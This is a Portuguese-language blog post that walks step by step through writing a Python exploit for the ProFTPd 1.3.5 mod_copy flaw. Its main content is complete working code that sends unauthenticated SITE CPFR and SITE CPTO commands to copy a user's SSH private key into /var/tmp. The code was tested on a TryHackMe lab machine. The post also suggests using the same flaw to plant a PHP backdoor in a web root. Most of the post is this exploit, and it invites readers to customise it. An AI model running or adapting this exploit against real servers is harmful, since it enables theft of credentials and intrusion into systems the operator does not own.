<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Proftpd Exploit | bielzao</title>
<meta name="keywords" content="">
<meta name="description" content="ProFTPd 1.3.5 mod_copy exploit Opa, eai! Tudo certo? Vamos treinar a escrita de exploits?
Vamos escrever um simples exploit para a vulnerabilidade encontrada no ProFTPd na versão 1.3.5.
OBS: Obviamente não fui eu quem descobriu tal vulnerabilidade, este artigo tem como objetivo apenas treinar a escrita de exploits e juntar programação com hacking!
Sobre a vulnerabilidade&hellip; Bom, para você que não conhece essa vulnerabilidade ainda, basicamente, ela consiste no fato de qualquer cliente, mesmo não estando autenticado no servidor que está rodando essa versão vulnerável do ProFTPd, consegue executar dois comando do FTP: o SITE CPFR e o SITE CPTO.">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/posts/proftpd-exploit/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/proftpd-exploit/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="bielzao (Alt + H)">bielzao</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Proftpd Exploit
      <span class="entry-hint" title="Draft">
        <svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentColor">
          <path
            d="M160-410v-60h300v60H160Zm0-165v-60h470v60H160Zm0-165v-60h470v60H160Zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22q0 11-4.5 22.5T862.09-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z" />
        </svg>
      </span>
    </h1>
    <div class="post-meta"><span title='2024-04-24 00:47:56 -0300 -03'>April 24, 2024</span>

</div>
  </header> 
  <div class="post-content"><h1 id="proftpd-135-mod_copy-exploit">ProFTPd 1.3.5 mod_copy exploit<a hidden class="anchor" aria-hidden="true" href="#proftpd-135-mod_copy-exploit">#</a></h1>
<p>Opa, eai! Tudo certo? Vamos treinar a escrita de exploits?</p>
<p>Vamos escrever um simples exploit para a vulnerabilidade encontrada no <strong>ProFTPd</strong> na versão <strong>1.3.5</strong>.</p>
<p><em>OBS: Obviamente não fui eu quem descobriu tal vulnerabilidade, este artigo tem como objetivo apenas treinar a escrita de exploits e juntar programação com hacking!</em></p>
<blockquote>
<h3 id="sobre-a-vulnerabilidade">Sobre a vulnerabilidade&hellip;<a hidden class="anchor" aria-hidden="true" href="#sobre-a-vulnerabilidade">#</a></h3>
<p>Bom, para você que não conhece essa vulnerabilidade ainda, basicamente, ela consiste no fato de qualquer cliente, mesmo não estando autenticado no servidor que está rodando essa versão vulnerável do ProFTPd, consegue executar dois comando do FTP: o <code>SITE CPFR </code> e o <code>SITE CPTO</code>.</p>
<h3 id="tá-mas-eai">Tá, mas eai?<a hidden class="anchor" aria-hidden="true" href="#tá-mas-eai">#</a></h3>
<p>Esses comandos funcionam como o <em>CTRL+C</em> e <em>CTRL+V,</em> ou seja, quer dizer que com eles você pode copiar um arquivo de uma parte do servidor para outra de sua escolha. Ai, vai da criatividade do atacante. Ele pode usar isso para mover a backdoor PHP dele para o diretório root da aplicação web que está rodando no servidor e então conseguir executar comandos no servidor, por exemplo.</p>
</blockquote>
<p>Beleza, agora que você já sabe vamos lá!</p>
<h2 id="o-mindset">O mindset<a hidden class="anchor" aria-hidden="true" href="#o-mindset">#</a></h2>
<p>Poderíamos usar C/C++ para implementar este exploit, ou mesmo, outra línguagem que possua suporte a implementação de sockets de redes.</p>
<p>Mas, por questão de simplicidade e pensando em um ambiente onde você conheça a vulnerabilidade mas não tenha um exploit pronto em mãos e precise codar um, com a limitação de ter apenas um editor de textos e um interpretador do python na máquina, vamos codar em python.</p>
<p>Eu sei, talvez tenha sido muito específico, mas, quando o assunto é Red Team, precisamos pensar nas mais variadas possibilidades.</p>
<p>Vamos lá!</p>
<h2 id="o-exploit">O exploit<a hidden class="anchor" aria-hidden="true" href="#o-exploit">#</a></h2>
<p>Para nos aproveitarmos desta vulnerabilidade, precisamos apenas nos conectar na porta a qual o software FTP vulnerável está executando e então enviarmos os comandos para serem processados pelo software vulnerável.</p>
<p><em>Neste cenário, eu usarei a sala <strong>Kenobi</strong> do <strong>TryHackMe</strong> para testar nossos código, pois ela já tem esta versão vulnerável do software executando, caso você queira treinar, te aconselho a fazer o mesmo!</em></p>
<p>Aqui está o código já criado:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target, port):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Exploiting...&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    client <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>connect((target, port))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    banner <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(banner)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;SITE CPFR /home/kenobi/.ssh/id_rsa</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(ans)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    client<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;SITE CPTO /var/tmp/id_rsa</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(ans)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[+] Success!&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;--target&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IP target&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-p&#34;</span>, <span style="color:#e6db74">&#34;--port&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Port target&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>target:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[ERROR] Specify the target&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>port:
</span></span><span style="display:flex;"><span>            target <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>target
</span></span><span style="display:flex;"><span>            port <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            exploit(target, port)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            target <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>target
</span></span><span style="display:flex;"><span>            port <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span>            exploit(target, port)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Dividimos esse exploit em duas funções: a <code>main</code> e a <code>exploit</code></p>
<p>Vamos para a função <code>exploit</code>.</p>
<h3 id="def-exploit">def exploit<a hidden class="anchor" aria-hidden="true" href="#def-exploit">#</a></h3>
<p>Vemos logo de início que esta função recebe dois parâmetros: <code>target</code> e <code>port</code> que correspondem as informações sobre o servidor alvo.</p>
<p>Após printarmos uma mensagem na tela, começamos criando nosso socket cliente que irá conectar ao servidor FTP vulnerável:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>client <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span></code></pre></div><p>Após isso, usamos esse socket criado para nos conectarmos ao servidor, usando as informações passadas para a função:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>client<span style="color:#f92672">.</span>connect((target, port))
</span></span></code></pre></div><p>Assim que a conexão é estabelecida, recebemos o banner que o software FTP apresenta sempre que ele recebe uma nova conexão:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>banner <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode()
</span></span></code></pre></div><p>Usamos o método <code>decoder()</code> pois, do socket recebemos bytes puros, que precisam ser decodificados em um formato que entendamos.</p>
<p>Após receber o banner, printarmos ele, já decodificado:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(banner)
</span></span></code></pre></div><p>Agora, podemos enviar o comando que irá copiar o arquivo desejado, que neste exemplo é a chave <em>id_rsa</em> do usuário <strong>kenobi</strong> da máquina.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>client<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;SITE CPFR /home/kenobi/.ssh/id_rsa</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>Como estamos lidando com um socket de rede, os dados que trafegam por ele são apenas bytes, por isso colocamos a mensagem entre aspas com um <strong>&ldquo;b&rdquo;</strong> na frente. Isso indica para o python tratar a string entre aspas como bytes.</p>
<p>Precisamos também adicionar uma <code>\r\n</code> indicando o fim do comando para o software FTP.</p>
<p>Após isso, precisamos receber a resposta da execução desse comando no servidor:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ans <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode()
</span></span></code></pre></div><p>Agora printarrmos a resposta do servidor:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(ans)
</span></span></code></pre></div><p>E repetiremos o processo anterior mas agora enviando o comando para colar a chave no nosso local desejado, que no nosso cenário aqui é o diretório <code>/tmp</code> do servidor e então já receberemos a resposta:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>client<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;SITE CPTO /var/tmp/id_rsa</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>ans <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode()
</span></span></code></pre></div><p>E mais uma vez printaremos a resposta do servidor:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(ans)
</span></span></code></pre></div><p>Após isso, apenas informamos que a execução ocorreu com sucesso.</p>
<h3 id="def-main">def main()<a hidden class="anchor" aria-hidden="true" href="#def-main">#</a></h3>
<p>Começamos criando o parser para fazer o parsing dos parâmetros que serão passafos para o nosso exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;--target&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IP target&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-p&#34;</span>, <span style="color:#e6db74">&#34;--port&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Port target&#34;</span>)
</span></span></code></pre></div><p>Nosso exploit terá dois parâmetros: <code>-t/--target</code> e <code>-p/--port</code>, um específica o IP alvo e o outro a porta na qual o FTP está executando no servidor. Geralmente é 21.</p>
<p>Após isso, pegarmos os argumentos passados:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span></code></pre></div><p>E, para evitamos erros, adicionamos uma checagem para saber se o alvo foi especificado, caso não, o exploit avisa e encerra a execução:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>target:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[ERROR] Specify the target&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span></code></pre></div><p>O alvo sendo especificado, entramos no bloco else, e já entramos em mais uma checagem. Mas, desta vez é para saber se uma porta foi especificada, caso não, a porta padrão (21) será usada. E então chamarmos a função <code>exploit()</code> explorando a vulnerabilidade:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>port:
</span></span><span style="display:flex;"><span>            target <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>target
</span></span><span style="display:flex;"><span>            port <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            exploit(target, port)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            target <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>target
</span></span><span style="display:flex;"><span>            port <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span>            exploit(target, port)
</span></span></code></pre></div><p>Agora, fazemos mais uma checagem:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Se o exploit for o módulo principal, executarmos ele.</p>
<h2 id="resultados">Resultados<a hidden class="anchor" aria-hidden="true" href="#resultados">#</a></h2>
<p>Veja o diretório <code>/tmp</code> antes da execução:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/bielzaoo/bielzaoo.github.io/main/images/proftpd/ls.png" alt="ls"  />
</p>
<p>Aqui está um exemplo da execução do exploit:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/bielzaoo/bielzaoo.github.io/main/images/proftpd/exploit-run.png" alt="exploit-run"  />
</p>
<p>Veja agora a presença da <code>id_rsa</code> no diretório:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/bielzaoo/bielzaoo.github.io/main/images/proftpd/id_rsa.png" alt="id_rsa"  />
</p>
<h1 id="concluindo">Concluindo<a hidden class="anchor" aria-hidden="true" href="#concluindo">#</a></h1>
<p>Veja que não foi tão complexo assim. Sei que não se trata de uma vulnerabilidade tão conhecida, talvez seja até um pouco difícil encontrá-la em um ambiente real, mas, aproveite e treine, tente customizar esse exploit, melhorá-lo, use sua criatividade!</p>
<p><em>Muito obrigado!</em>
<em>Fique com Deus!</em></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="http://localhost:1313/">bielzao</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
